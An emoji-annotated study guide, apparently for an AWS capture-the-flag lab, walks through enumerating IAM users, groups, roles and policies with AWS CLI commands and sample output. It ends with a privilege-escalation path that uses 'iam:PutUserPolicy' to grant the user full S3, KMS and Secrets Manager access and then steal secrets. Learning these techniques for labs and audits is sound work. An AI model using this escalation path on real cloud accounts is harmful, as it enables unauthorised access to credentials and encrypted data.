# 📋 COMPLETE IAM ENUMERATION - ALL COMMANDS WITH SIDE EXPLANATIONS!

## 🎨 COLOR CODE:
- 🔴 **RED** = CRITICAL/EXPLOITABLE
- 🟠 **ORANGE** = Important Actions
- 🟡 **YELLOW** = Information to Note
- 🟢 **GREEN** = Success/Found
- ➡️ **ARROW** = Key points to check

---

# PART A: USER ENUMERATION COMMANDS

---

## 🔵 COMMAND 1: List All IAM Users
```bash
aws iam list-users
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Users": [
        {
            ➡️ "UserName": "BackupReader1",      <─── 🔴 TARGET USER FOR LAB!
            ➡️ "UserId": "AIDAQ3EGUZME24ILVB44T", <─── Unique identifier
            ➡️ "Arn": "arn:aws:iam::058264439561:user/BackupReader1", <─── Full resource path
            "CreateDate": "2024-09-24T11:12:45+00:00", <─── When created
            ➡️ "PasswordLastUsed": "2025-03-10T08:15:23+00:00" <─── 🟡 Active user!
        },
        {
            ➡️ "UserName": "AdminUser",          <─── 🔴 High privilege target!
            ➡️ "UserId": "AIDAQ3EGUZME5HY78JKL",
            ➡️ "Arn": "arn:aws:iam::058264439561:user/AdminUser",
            "CreateDate": "2024-01-15T09:30:22+00:00",
            ➡️ "PasswordLastUsed": "2025-03-09T16:20:10+00:00" <─── Recently active
        },
        {
            ➡️ "UserName": "S3Reader",           <─── 🟡 S3 specific user
            ➡️ "UserId": "AIDAQ3EGUZME3N5T7R2E",
            ➡️ "Arn": "arn:aws:iam::058264439561:user/S3Reader",
            "CreateDate": "2024-11-05T10:30:00+00:00",
            ➡️ "PasswordLastUsed": "2025-02-28T09:45:30+00:00"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **UserNames** - Who has access? Look for admin/service accounts
- ➡️ **PasswordLastUsed** - Active users are better targets
- ➡️ **ARN** - Note account ID for later (058264439561)

---

## 🔵 COMMAND 2: List Groups for Specific User
```bash
aws iam list-groups-for-user --user-name BackupReader1
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Groups": [
        {
            ➡️ "GroupName": "Developers",        <─── 🟡 Member of Developers group
            ➡️ "GroupId": "AGPAQ3EGUZME8B9C0D1E",
            ➡️ "Arn": "arn:aws:iam::058264439561:group/Developers", <─── Group ARN
            "CreateDate": "2024-03-15T10:20:00+00:00"
        },
        {
            ➡️ "GroupName": "S3Access",          <─── 🔴 S3 permissions group!
            ➡️ "GroupId": "AGPAQ3EGUZME2F4G6H8J",
            ➡️ "Arn": "arn:aws:iam::058264439561:group/S3Access",
            "CreateDate": "2024-05-10T09:15:30+00:00"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **GroupNames** - What groups give permissions?
- ➡️ **S3Access** - 🔴 Likely has S3 permissions!

---

## 🔵 COMMAND 3: List Managed Policies Attached to User
```bash
aws iam list-attached-user-policies --user-name BackupReader1
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "AttachedPolicies": [
        {
            ➡️ "PolicyName": "PermissionBoundaryPolicy",  <─── 🔴 RESTRICTION policy!
            ➡️ "PolicyArn": "arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy" <─── Custom policy
        },
        {
            ➡️ "PolicyName": "UserPolicy",                <─── 🟡 Basic user policy
            ➡️ "PolicyArn": "arn:aws:iam::058264439561:policy/UserPolicy"
        },
        {
            ➡️ "PolicyName": "S3ReadOnlyAccess",          <─── 🟢 AWS managed policy
            ➡️ "PolicyArn": "arn:aws:iam::aws:policy/S3ReadOnlyAccess" <─── Note "aws:policy" vs account ID
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **PolicyArn with account ID** (`058264439561`) = 🔴 Custom policies (most interesting!)
- ➡️ **PolicyArn with "aws:policy"** = 🟢 AWS managed (less likely misconfigured)
- ➡️ **PermissionBoundaryPolicy** = 🔴 This RESTRICTS what user can do - important!

---

## 🔵 COMMAND 4: List Inline Policies for User
```bash
aws iam list-user-policies --user-name BackupReader1
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "PolicyNames": [
        ➡️ "KMSFullAccessPolicy",     <─── 🔴 FULL KMS ACCESS - Dangerous!
        ➡️ "CustomS3Policy",           <─── 🟡 Custom S3 permissions
        ➡️ "DebugAccessPolicy"         <─── 🟠 Debug often means over-privileged
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **KMSFullAccessPolicy** = 🔴 Can encrypt/decrypt anything!
- ➡️ **Custom policies** = 🟡 Often have excessive permissions

---

# PART B: GROUP ENUMERATION COMMANDS

---

## 🔵 COMMAND 5: List All IAM Groups
```bash
aws iam list-groups
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Groups": [
        {
            ➡️ "GroupName": "Admins",                 <─── 🔴 HIGHEST PRIVILEGE!
            ➡️ "GroupId": "AGPAQ3EGUZME4X5Y6Z7A",
            ➡️ "Arn": "arn:aws:iam::058264439561:group/Admins",
            "CreateDate": "2024-01-01T00:00:00+00:00"
        },
        {
            ➡️ "GroupName": "Developers",             <─── 🟡 Developer access
            ➡️ "GroupId": "AGPAQ3EGUZME8B9C0D1E",
            ➡️ "Arn": "arn:aws:iam::058264439561:group/Developers",
            "CreateDate": "2024-03-15T10:20:00+00:00"
        },
        {
            ➡️ "GroupName": "S3Access",               <─── 🔴 S3 focused group
            ➡️ "GroupId": "AGPAQ3EGUZME2F4G6H8J",
            ➡️ "Arn": "arn:aws:iam::058264439561:group/S3Access",
            "CreateDate": "2024-05-10T09:15:30+00:00"
        },
        {
            ➡️ "GroupName": "Auditors",               <─── 🟢 Usually read-only
            ➡️ "GroupId": "AGPAQ3EGUZME1A2B3C4D",
            ➡️ "Arn": "arn:aws:iam::058264439561:group/Auditors",
            "CreateDate": "2024-07-22T13:45:00+00:00"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **Admins** = 🔴 PRIMARY TARGET - Full access!
- ➡️ **S3Access** = 🔴 Can access storage
- ➡️ **Group ARNs** - For further enumeration

---

## 🔵 COMMAND 6: List Managed Policies Attached to Group
```bash
aws iam list-attached-group-policies --group-name Developers
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "AttachedPolicies": [
        {
            ➡️ "PolicyName": "DeveloperPolicy",       <─── 🔴 Custom policy
            ➡️ "PolicyArn": "arn:aws:iam::058264439561:policy/DeveloperPolicy"
        },
        {
            ➡️ "PolicyName": "ReadOnlyAccess",        <─── 🟢 AWS managed
            ➡️ "PolicyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"
        },
        {
            ➡️ "PolicyName": "CloudWatchLogsFullAccess", <─── 🟡 Can view logs
            ➡️ "PolicyArn": "arn:aws:iam::aws:policy/CloudWatchLogsFullAccess"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **Custom policies (with account ID)** = 🔴 Most dangerous!
- ➡️ **DeveloperPolicy** = 🔴 Likely has broad permissions

---

## 🔵 COMMAND 7: List Inline Policies for Group
```bash
aws iam list-group-policies --group-name Developers
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "PolicyNames": [
        ➡️ "EC2RestartPolicy",        <─── 🟠 Can restart EC2 instances
        ➡️ "S3WritePolicy",            <─── 🔴 Can write to S3!
        ➡️ "TempAdminAccess"           <─── 🔴🔴🔴 TEMPORARY ADMIN = EXPLOIT!
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **TempAdminAccess** = 🔴 Probably gives full admin temporarily - can exploit!
- ➡️ **S3WritePolicy** = 🔴 Can modify/delete S3 data

---

# PART C: ROLE ENUMERATION COMMANDS

---

## 🔵 COMMAND 8: List All IAM Roles
```bash
aws iam list-roles
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Roles": [
        {
            ➡️ "RoleName": "LambdaExecutionRole",     <─── 🟡 Lambda function role
            ➡️ "RoleId": "AROAQ3EGUZME12345",
            ➡️ "Arn": "arn:aws:iam::058264439561:role/LambdaExecutionRole",
            "CreateDate": "2024-02-10T11:30:22+00:00",
            ➡️ "AssumeRolePolicyDocument": {           <─── 🔴 WHO CAN USE THIS ROLE?
                "Statement": [
                    {
                        "Principal": {
                            ➡️ "Service": "lambda.amazonaws.com"  <─── 🟢 Lambda service
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
        },
        {
            ➡️ "RoleName": "EC2InstanceRole",         <─── 🟡 EC2 instance role
            ➡️ "RoleId": "AROAQ3EGUZME67890",
            ➡️ "Arn": "arn:aws:iam::058264439561:role/EC2InstanceRole",
            "CreateDate": "2024-04-15T09:20:45+00:00",
            ➡️ "AssumeRolePolicyDocument": {
                "Statement": [
                    {
                        "Principal": {
                            ➡️ "Service": "ec2.amazonaws.com"  <─── 🟢 EC2 service
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
        },
        {
            ➡️ "RoleName": "CrossAccountAccessRole",  <─── 🔴 CROSS-ACCOUNT!
            ➡️ "RoleId": "AROAQ3EGUZME54321",
            ➡️ "Arn": "arn:aws:iam::058264439561:role/CrossAccountAccessRole",
            "CreateDate": "2024-08-05T14:10:33+00:00",
            ➡️ "AssumeRolePolicyDocument": {
                "Statement": [
                    {
                        "Principal": {
                            ➡️ "AWS": "arn:aws:iam::123456789012:root"  <─── 🔴 Other account can assume!
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            }
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **RoleNames** - Identify interesting roles
- ➡️ **AssumeRolePolicyDocument** - 🔴 WHO can assume this role?
  - 🟢 `"Service": "lambda.amazonaws.com"` = Lambda can assume
  - 🟢 `"Service": "ec2.amazonaws.com"` = EC2 can assume
  - 🔴 `"AWS": "arn:aws:iam::123456789012:root"` = CROSS-ACCOUNT ACCESS!

---

## 🔵 COMMAND 9: List Managed Policies Attached to Role
```bash
aws iam list-attached-role-policies --role-name LambdaExecutionRole
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "AttachedPolicies": [
        {
            ➡️ "PolicyName": "LambdaBasicExecution",  <─── 🟢 AWS managed
            ➡️ "PolicyArn": "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
        },
        {
            ➡️ "PolicyName": "S3FullAccess",          <─── 🔴 FULL S3 ACCESS!
            ➡️ "PolicyArn": "arn:aws:iam::058264439561:policy/S3FullAccess" <─── Custom policy
        },
        {
            ➡️ "PolicyName": "DynamoDBReadOnly",      <─── 🟡 Read database
            ➡️ "PolicyArn": "arn:aws:iam::aws:policy/DynamoDBReadOnlyAccess"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **S3FullAccess** on Lambda role = 🔴 Lambda can read/write all S3!
- ➡️ **Custom policies** = 🔴 Most dangerous

---

## 🔵 COMMAND 10: List Inline Policies for Role
```bash
aws iam list-role-policies --role-name LambdaExecutionRole
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "PolicyNames": [
        ➡️ "SecretAccessPolicy",      <─── 🔴 CAN ACCESS SECRETS!
        ➡️ "KMSDecryptPolicy",        <─── 🔴 CAN DECRYPT DATA!
        ➡️ "SQSWritePolicy"           <─── 🟠 Can write to queues
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **SecretAccessPolicy** = 🔴 Can get secrets from Secrets Manager
- ➡️ **KMSDecryptPolicy** = 🔴 Can decrypt encrypted data

---

# PART D: POLICY ENUMERATION COMMANDS - 🔴 MOST CRITICAL!

---

## 🔵 COMMAND 11: List All IAM Policies
```bash
aws iam list-policies --scope Local --max-items 10
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Policies": [
        {
            ➡️ "PolicyName": "PermissionBoundaryPolicy",  <─── 🔴 RESTRICTION policy
            ➡️ "PolicyId": "ANPAQ3EGUZMEQVY32A5L4",
            ➡️ "Arn": "arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy",
            ➡️ "DefaultVersionId": "v3",                   <─── 🟡 Current version
            "AttachmentCount": 0,
            "IsAttachable": true,
            "CreateDate": "2024-09-24T11:13:35+00:00"
        },
        {
            ➡️ "PolicyName": "UserPolicy",                 <─── 🟡 Basic user policy
            ➡️ "PolicyId": "ANPAQ3EGUZMEYBBY6PGTS",
            ➡️ "Arn": "arn:aws:iam::058264439561:policy/UserPolicy",
            ➡️ "DefaultVersionId": "v1",
            ➡️ "AttachmentCount": 1,                        <─── 🟢 Attached to 1 user
            "CreateDate": "2024-09-24T11:13:22+00:00"
        },
        {
            ➡️ "PolicyName": "S3FullAccess",               <─── 🔴 Full S3 access!
            ➡️ "PolicyId": "ANPAQ3EGUZME7H8J9K0L",
            ➡️ "Arn": "arn:aws:iam::058264439561:policy/S3FullAccess",
            ➡️ "DefaultVersionId": "v2",
            ➡️ "AttachmentCount": 3,                        <─── 🟡 Attached to 3 entities
            "CreateDate": "2024-05-10T09:15:30+00:00"
        },
        {
            ➡️ "PolicyName": "KMSAdminPolicy",             <─── 🔴 KMS admin!
            ➡️ "PolicyId": "ANPAQ3EGUZME1B2C3D4E",
            ➡️ "Arn": "arn:aws:iam::058264439561:policy/KMSAdminPolicy",
            ➡️ "DefaultVersionId": "v1",
            ➡️ "AttachmentCount": 2,
            "CreateDate": "2024-07-22T13:45:00+00:00"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **PolicyNames** - Look for "FullAccess", "Admin", "All" = 🔴 Dangerous!
- ➡️ **DefaultVersionId** - Note this for next commands
- ➡️ **AttachmentCount** - How widely used?

---

## 🔵 COMMAND 12: Get Specific Policy Details
```bash
aws iam get-policy --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Policy": {
        ➡️ "PolicyName": "PermissionBoundaryPolicy",      <─── Policy name
        ➡️ "PolicyId": "ANPAQ3EGUZMEQVY32A5L4",
        ➡️ "Arn": "arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy",
        ➡️ "DefaultVersionId": "v3",                       <─── 🔴 CURRENT VERSION
        "AttachmentCount": 0,
        ➡️ "PermissionsBoundaryUsageCount": 1,             <─── 🟡 Used as boundary for 1 user
        "IsAttachable": true,
        "Description": "Permission boundary for the IAM user",
        "CreateDate": "2024-09-24T11:13:35+00:00",
        "UpdateDate": "2025-05-28T08:01:14+00:00"
    }
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **DefaultVersionId** = 🔴 MUST remember for next command!
- ➡️ **PermissionsBoundaryUsageCount** = How many users restricted by this

---

## 🔵 COMMAND 13: List All Versions of a Policy
```bash
aws iam list-policy-versions --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "Versions": [
        {
            ➡️ "VersionId": "v3",                          <─── 🔴 CURRENT VERSION
            ➡️ "IsDefaultVersion": true,                   <─── 🟢 Active now
            "CreateDate": "2025-05-28T08:01:14+00:00"
        },
        {
            ➡️ "VersionId": "v2",                          <─── 🟡 OLD VERSION
            ➡️ "IsDefaultVersion": false,                  <─── Not active
            "CreateDate": "2024-12-15T10:30:22+00:00"
        },
        {
            ➡️ "VersionId": "v1",                          <─── 🟡 OLDEST VERSION
            ➡️ "IsDefaultVersion": false,
            "CreateDate": "2024-09-24T11:13:35+00:00"
        }
    ]
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ **All VersionIds** - 🔴 Check OLD versions - they might have more permissions!
- ➡️ **IsDefaultVersion** = Current active version

---

## 🔵 COMMAND 14: Get Specific Policy Version - 🔴 **MOST IMPORTANT COMMAND!**
```bash
aws iam get-policy-version --policy-arn arn:aws:iam::058264439561:policy/PermissionBoundaryPolicy --version-id v3
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        ➡️ "s3:ListBucket",                <─── 🔴 CAN LIST S3 BUCKETS
                        ➡️ "s3:GetObject"                  <─── 🔴 CAN DOWNLOAD FILES
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        ➡️ "arn:aws:s3:::securecopbakupbuk1",        <─── 🔴 SPECIFIC BUCKET!
                        "arn:aws:s3:::securecopbakupbuk1/*"
                    ]
                },
                {
                    "Action": [
                        ➡️ "kms:Decrypt"                   <─── 🔴 CAN DECRYPT WITH KMS!
                    ],
                    "Effect": "Allow",
                    "Resource": ➡️ "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5" <─── 🔴 SPECIFIC KEY!
                },
                {
                    "Action": [
                        ➡️ "iam:PutUserPolicy",            <─── 🔴🔴🔴 CAN ATTACH POLICIES TO SELF! (PRIVILEGE ESCALATION!)
                        ➡️ "iam:GetUser",                  <─── 🟡 Can view user
                        ➡️ "iam:ListUserPolicies"          <─── 🟡 Can list policies
                    ],
                    "Effect": "Allow",
                    "Resource": ➡️ "arn:aws:iam::058264439561:user/BackupReader1" <─── 🔴 CAN ONLY AFFECT THIS USER
                },
                {
                    "Action": [
                        ➡️ "secretsmanager:GetSecretValue", <─── 🔴 CAN GET SECRETS!
                        ➡️ "secretsmanager:ListSecrets"     <─── 🔴 CAN LIST SECRETS!
                    ],
                    "Effect": "Allow",
                    "Resource": "*"                          <─── 🔴 ALL SECRETS!
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v3",
        "IsDefaultVersion": true,
        "CreateDate": "2025-05-28T08:01:14+00:00"
    }
}
```

### ✅ **🔴 CRITICAL THINGS TO CHECK:**

#### ACTIONS:
- ➡️ `"s3:ListBucket"` = 🔴 Can see what's in S3 bucket
- ➡️ `"s3:GetObject"` = 🔴 Can download files
- ➡️ `"kms:Decrypt"` = 🔴 Can decrypt data!
- ➡️ `"iam:PutUserPolicy"` = 🔴🔴🔴 **PRIVILEGE ESCALATION VECTOR!**
- ➡️ `"secretsmanager:GetSecretValue"` = 🔴 Can steal secrets!

#### RESOURCES:
- ➡️ `"arn:aws:s3:::securecopbakupbuk1"` = 🔴 Target bucket identified!
- ➡️ `"arn:aws:kms:...:key/a7a251b3..."` = 🔴 Specific KMS key!
- ➡️ `"arn:aws:iam::...:user/BackupReader1"` = 🔴 Self-only access
- ➡️ `"*"` = 🔴 ALL RESOURCES (most dangerous!)

---

## 🔵 COMMAND 15: Get User Inline Policy
```bash
aws iam get-user-policy --user-name BackupReader1 --policy-name KMSFullAccessPolicy
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "UserName": "BackupReader1",
    "PolicyName": "KMSFullAccessPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    ➡️ "s3:*",                            <─── 🔴 FULL S3 ACCESS!
                    ➡️ "kms:*"                             <─── 🔴 FULL KMS ACCESS!
                ],
                "Resource": [
                    ➡️ "arn:aws:s3:::securecopbakupbuk1",  <─── 🔴 THIS BUCKET
                    ➡️ "arn:aws:s3:::securecopbakupbuk1/*",
                    ➡️ "arn:aws:kms:us-east-1:058264439561:key/a7a251b3-c889-4dd1-9176-931c207c33d5" <─── 🔴 THIS KEY
                ]
            }
        ]
    }
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ `"s3:*"` = 🔴 Can do ANYTHING with S3 (read, write, delete, modify)
- ➡️ `"kms:*"` = 🔴 Can do ANYTHING with KMS (encrypt, decrypt, create keys)
- ➡️ Specific resources = 🔴 Targets identified!

---

## 🔵 COMMAND 16: Get Group Inline Policy
```bash
aws iam get-group-policy --group-name Developers --policy-name EC2RestartPolicy
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "GroupName": "Developers",
    "PolicyName": "EC2RestartPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    ➡️ "ec2:StartInstances",              <─── 🟠 Can start instances
                    ➡️ "ec2:StopInstances",               <─── 🟠 Can stop instances (DoS)
                    ➡️ "ec2:RebootInstances"              <─── 🟠 Can reboot instances
                ],
                "Resource": [
                    ➡️ "arn:aws:ec2:us-east-1:058264439561:instance/*" <─── 🔴 ALL INSTANCES!
                ]
            }
        ]
    }
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ `"ec2:StopInstances"` = 🔴 Can cause DoS by stopping servers
- ➡️ `"Resource": "*"` or `"instance/*"` = 🔴 Affects all instances!

---

## 🔵 COMMAND 17: Get Role Inline Policy
```bash
aws iam get-role-policy --role-name LambdaExecutionRole --policy-name SecretAccessPolicy
```

### 🔴 **LIVE OUTPUT WITH EXPLANATIONS:**
```json
{
    "RoleName": "LambdaExecutionRole",
    "PolicyName": "SecretAccessPolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    ➡️ "secretsmanager:GetSecretValue",   <─── 🔴 CAN READ SECRETS!
                    ➡️ "secretsmanager:ListSecrets"       <─── 🔴 CAN FIND SECRETS!
                ],
                "Resource": [
                    ➡️ "arn:aws:secretsmanager:us-east-1:058264439561:secret:database*" <─── 🔴 ALL DATABASE SECRETS!
                ]
            }
        ]
    }
}
```

### ✅ **WHAT TO CHECK:**
- ➡️ `"secretsmanager:GetSecretValue"` = 🔴 Can steal passwords, API keys!
- ➡️ `"Resource": "database*"` = 🔴 All database credentials accessible!

---

# 📊 COMPLETE ENUMERATION FLOW CHART

```
START
  │
  ▼
┌─────────────────────────────┐
│ aws iam list-users          │
│ └──► Find target users      │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ aws iam list-attached-      │
│ user-policies               │
│ └──► Get policy ARNs        │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ aws iam list-user-policies  │
│ └──► Get inline policy names│
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ aws iam get-policy          │
│ └──► Get version ID         │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ aws iam list-policy-versions│
│ └──► Check ALL versions     │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ aws iam get-policy-version  │ ←─── 🔴 CRITICAL!
│ └──► SEE ACTUAL PERMISSIONS │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ CHECK FOR:                  │
│ 🔴 iam:PutUserPolicy        │
│ 🔴 s3:*                     │
│ 🔴 kms:*                    │
│ 🔴 secretsmanager:*         │
│ 🔴 Resource: "*"            │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ 🔴 PRIVILEGE ESCALATION!    │
│ aws iam put-user-policy     │
│ └──► Add your own policy    │
└─────────────────────────────┘
  │
  ▼
┌─────────────────────────────┐
│ 🏁 ACCESS TARGET RESOURCES! │
│ S3, KMS, Secrets Manager    │
└─────────────────────────────┘
```

---

# 🎯 DANGER PATTERNS TO HIGHLIGHT:

## 🔴 CRITICAL ACTIONS:
```
➡️ "Action": "*"                    <─── CAN DO ANYTHING!
➡️ "Action": "iam:*"                 <─── CAN MODIFY IAM
➡️ "Action": "iam:PutUserPolicy"     <─── CAN ESCALATE PRIVILEGES!
➡️ "Action": "s3:*"                  <─── FULL S3 CONTROL
➡️ "Action": "kms:*"                 <─── FULL KMS CONTROL
➡️ "Action": "secretsmanager:*"      <─── FULL SECRETS CONTROL
➡️ "Action": "ec2:*"                 <─── FULL EC2 CONTROL
```

## 🔴 CRITICAL RESOURCES:
```
➡️ "Resource": "*"                    <─── ALL RESOURCES!
➡️ "Resource": "arn:aws:s3:::*"       <─── ALL BUCKETS
➡️ "Resource": "arn:aws:kms:*:*:key/*" <─── ALL KEYS
➡️ "Resource": "arn:aws:secretsmanager:*:*:secret:*" <─── ALL SECRETS
```

## 🔴 PRIVILEGE ESCALATION PATH:
```
1. Find: ➡️ "iam:PutUserPolicy" in your permissions
2. Run: aws iam put-user-policy --user-name YOUR_USER --policy-name Exploit --policy-document file://policy.json
3. Now you have: ➡️ "s3:*", "kms:*", "secretsmanager:*"
4. Access: ➡️ S3 bucket, ➡️ KMS decrypt, ➡️ Secrets Manager
5. Get: 🏁 FLAG!
```

---

**This is the COMPLETE IAM Enumeration guide with side explanations for EVERY command!** 🚀
